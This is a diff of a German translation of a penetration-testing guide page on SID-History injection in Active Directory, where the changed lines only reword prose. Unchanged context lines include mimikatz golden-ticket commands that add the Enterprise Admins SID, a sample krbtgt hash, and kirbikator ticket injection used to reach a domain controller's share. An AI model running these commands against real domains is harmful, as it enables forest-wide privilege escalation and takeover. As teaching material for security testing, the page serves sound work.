@@ -4,11 +4,11 @@
 
 ## SID-History Injection Angriff
 
-Der Fokus des **SID-History Injection Angriffs** liegt darauf, **Benutzermigrationen zwischen Domänen** zu unterstützen und gleichzeitig den Zugriff auf Ressourcen der vorherigen Domäne zu gewährleisten. Dies wird erreicht, indem **der vorherige Sicherheitsbezeichner (SID) des Benutzers in die SID-History** seines neuen Kontos integriert wird. Bemerkenswert ist, dass dieser Prozess manipuliert werden kann, um unbefugten Zugriff zu gewähren, indem der SID einer hochprivilegierten Gruppe (wie Enterprise Admins oder Domain Admins) aus der übergeordneten Domäne zur SID-History hinzugefügt wird. Diese Ausnutzung gewährt Zugriff auf alle Ressourcen innerhalb der übergeordneten Domäne.
+Der Fokus des **SID-History Injection Angriffs** liegt darauf, **Benutzermigrationen zwischen Domänen** zu unterstützen und gleichzeitig den Zugriff auf Ressourcen der vorherigen Domäne zu gewährleisten. Dies wird erreicht, indem **der vorherige Sicherheitsbezeichner (SID) des Benutzers in die SID-History** seines neuen Kontos integriert wird. Bemerkenswerterweise kann dieser Prozess manipuliert werden, um unbefugten Zugriff zu gewähren, indem der SID einer hochprivilegierten Gruppe (wie Enterprise Admins oder Domain Admins) aus der übergeordneten Domäne zur SID-History hinzugefügt wird. Diese Ausnutzung gewährt Zugriff auf alle Ressourcen innerhalb der übergeordneten Domäne.
 
 Es gibt zwei Methoden, um diesen Angriff auszuführen: durch die Erstellung eines **Golden Ticket** oder eines **Diamond Ticket**.
 
-Um den SID für die Gruppe **"Enterprise Admins"** zu ermitteln, muss zunächst der SID der Root-Domäne gefunden werden. Nach der Identifizierung kann der SID der Enterprise Admins-Gruppe konstruiert werden, indem `-519` an den SID der Root-Domäne angehängt wird. Wenn der SID der Root-Domäne beispielsweise `S-1-5-21-280534878-1496970234-700767426` ist, wäre der resultierende SID für die Gruppe "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.
+Um den SID für die Gruppe **"Enterprise Admins"** zu bestimmen, muss zunächst der SID der Root-Domäne gefunden werden. Nach der Identifizierung kann der SID der Enterprise Admins-Gruppe konstruiert werden, indem `-519` an den SID der Root-Domäne angehängt wird. Wenn der SID der Root-Domäne beispielsweise `S-1-5-21-280534878-1496970234-700767426` ist, wäre der resultierende SID für die Gruppe "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.
 
 Sie könnten auch die **Domain Admins**-Gruppen verwenden, die mit **512** enden.
 
@@ -33,7 +33,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Für weitere Informationen über goldene Tickets siehe:
+Für weitere Informationen zu goldenen Tickets siehe:
 
 {{#ref}}
 golden-ticket.md
@@ -59,7 +59,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Erhöhen Sie die Berechtigungen auf DA von root oder Enterprise-Admin unter Verwendung des KRBTGT-Hashes der kompromittierten Domäne:
+Erhöhen Sie sich zu DA von Root oder Enterprise-Administrator unter Verwendung des KRBTGT-Hashes der kompromittierten Domäne:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
